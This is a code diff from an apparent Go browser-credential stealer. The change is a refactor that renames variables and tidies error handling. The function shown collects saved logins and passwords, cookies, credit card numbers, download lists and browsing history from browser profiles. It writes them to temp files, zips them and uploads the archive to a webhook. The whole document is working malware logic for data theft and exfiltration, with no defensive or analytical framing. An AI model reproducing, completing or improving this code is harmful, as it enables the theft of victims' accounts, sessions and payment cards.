@@ -142,10 +142,10 @@ func GeckoSteal() []Profile {
 }
 
 func Run(webhook string) {
-	tempdir := filepath.Join(os.TempDir(), "browsers-temp")
-	os.MkdirAll(tempdir, os.ModePerm)
+	tempDir := filepath.Join(os.TempDir(), "browsers-temp")
+	os.MkdirAll(tempDir, os.ModePerm)
 
-	defer os.RemoveAll(tempdir)
+	defer os.RemoveAll(tempDir)
 
 	var profiles []Profile
 	profiles = append(profiles, ChromiumSteal()...)
@@ -159,12 +159,12 @@ func Run(webhook string) {
 		if len(profile.Logins) == 0 && len(profile.Cookies) == 0 && len(profile.CreditCards) == 0 && len(profile.Downloads) == 0 && len(profile.History) == 0 {
 			continue
 		}
-		os.MkdirAll(filepath.Join(tempdir, profile.Browser.User, profile.Browser.Name, profile.Name), os.ModePerm)
+		os.MkdirAll(filepath.Join(tempDir, profile.Browser.User, profile.Browser.Name, profile.Name), os.ModePerm)
 
 		if len(profile.Logins) > 0 {
-			fileutil.AppendFile(filepath.Join(tempdir, profile.Browser.User, profile.Browser.Name, profile.Name, "logins.txt"), fmt.Sprintf("%-50s %-50s %-50s", "URL", "Username", "Password"))
+			fileutil.AppendFile(filepath.Join(tempDir, profile.Browser.User, profile.Browser.Name, profile.Name, "logins.txt"), fmt.Sprintf("%-50s %-50s %-50s", "URL", "Username", "Password"))
 			for _, login := range profile.Logins {
-				fileutil.AppendFile(fmt.Sprintf("%s\\%s\\%s\\%s\\logins.txt", tempdir, profile.Browser.User, profile.Browser.Name, profile.Name), fmt.Sprintf("%-50s %-50s %-50s", login.LoginURL, login.Username, login.Password))
+				fileutil.AppendFile(fmt.Sprintf("%s\\%s\\%s\\%s\\logins.txt", tempDir, profile.Browser.User, profile.Browser.Name, profile.Name), fmt.Sprintf("%-50s %-50s %-50s", login.LoginURL, login.Username, login.Password))
 			}
 		}
 
@@ -184,45 +184,44 @@ func Run(webhook string) {
 					host = "TRUE"
 				}
 
-				fileutil.AppendFile(filepath.Join(tempdir, profile.Browser.User, profile.Browser.Name, profile.Name, "cookies.txt"), fmt.Sprintf("%s\t%s\t%s\t%s\t%d\t%s\t%s", cookie.Host, expires, cookie.Path, host, cookie.ExpireDate, cookie.Name, cookie.Value))
+				fileutil.AppendFile(filepath.Join(tempDir, profile.Browser.User, profile.Browser.Name, profile.Name, "cookies.txt"), fmt.Sprintf("%s\t%s\t%s\t%s\t%d\t%s\t%s", cookie.Host, expires, cookie.Path, host, cookie.ExpireDate, cookie.Name, cookie.Value))
 			}
 		}
 
 		if len(profile.CreditCards) > 0 {
-			fileutil.AppendFile(filepath.Join(tempdir, profile.Browser.User, profile.Browser.Name, profile.Name, "credit_cards.txt"), fmt.Sprintf("%-30s %-30s %-30s %-30s %-30s", "Number", "Expiration Month", "Expiration Year", "Name", "Address"))
+			fileutil.AppendFile(filepath.Join(tempDir, profile.Browser.User, profile.Browser.Name, profile.Name, "credit_cards.txt"), fmt.Sprintf("%-30s %-30s %-30s %-30s %-30s", "Number", "Expiration Month", "Expiration Year", "Name", "Address"))
 			for _, cc := range profile.CreditCards {
-				fileutil.AppendFile(filepath.Join(tempdir, profile.Browser.User, profile.Browser.Name, profile.Name, "credit_cards.txt"), fmt.Sprintf("%-30s %-30s %-30s %-30s %-30s", cc.Number, cc.ExpirationMonth, cc.ExpirationYear, cc.Name, cc.Address))
+				fileutil.AppendFile(filepath.Join(tempDir, profile.Browser.User, profile.Browser.Name, profile.Name, "credit_cards.txt"), fmt.Sprintf("%-30s %-30s %-30s %-30s %-30s", cc.Number, cc.ExpirationMonth, cc.ExpirationYear, cc.Name, cc.Address))
 			}
 		}
 
 		if len(profile.Downloads) > 0 {
-			fileutil.AppendFile(filepath.Join(tempdir, profile.Browser.User, profile.Browser.Name, profile.Name, "downloads.txt"), fmt.Sprintf("%-70s %-70s", "Target Path", "URL"))
+			fileutil.AppendFile(filepath.Join(tempDir, profile.Browser.User, profile.Browser.Name, profile.Name, "downloads.txt"), fmt.Sprintf("%-70s %-70s", "Target Path", "URL"))
 			for _, download := range profile.Downloads {
-				fileutil.AppendFile(filepath.Join(tempdir, profile.Browser.User, profile.Browser.Name, profile.Name, "downloads.txt"), fmt.Sprintf("%-70s %-70s", download.TargetPath, download.URL))
+				fileutil.AppendFile(filepath.Join(tempDir, profile.Browser.User, profile.Browser.Name, profile.Name, "downloads.txt"), fmt.Sprintf("%-70s %-70s", download.TargetPath, download.URL))
 			}
 		}
 
 		if len(profile.History) > 0 {
-			fileutil.AppendFile(filepath.Join(tempdir, profile.Browser.User, profile.Browser.Name, profile.Name, "history.txt"), fmt.Sprintf("%-70s %-70s", "Title", "URL"))
+			fileutil.AppendFile(filepath.Join(tempDir, profile.Browser.User, profile.Browser.Name, profile.Name, "history.txt"), fmt.Sprintf("%-70s %-70s", "Title", "URL"))
 			for _, history := range profile.History {
-				fileutil.AppendFile(filepath.Join(tempdir, profile.Browser.User, profile.Browser.Name, profile.Name, "history.txt"), fmt.Sprintf("%-70s %-70s", history.Title, history.URL))
+				fileutil.AppendFile(filepath.Join(tempDir, profile.Browser.User, profile.Browser.Name, profile.Name, "history.txt"), fmt.Sprintf("%-70s %-70s", history.Title, history.URL))
 			}
 		}
 
 	}
-	tempzip := filepath.Join(os.TempDir(), "browsers.zip")
-	err := fileutil.Zip(tempdir, tempzip)
-	if err != nil {
+	tempZip := filepath.Join(os.TempDir(), "browsers.zip")
+	if err := fileutil.Zip(tempDir, tempZip); err != nil {
 		return
 	}
-	defer os.Remove(tempzip)
+	defer os.Remove(tempZip)
 
 	requests.Webhook(webhook, map[string]interface{}{
 		"embeds": []map[string]interface{}{
 			{
 				"title":       "Browsers",
-				"description": fmt.Sprintf("```%s```", fileutil.Tree(tempdir, "")),
+				"description": fmt.Sprintf("```%s```", fileutil.Tree(tempDir, "")),
 			},
 		},
-	}, tempzip)
+	}, tempZip)
 }
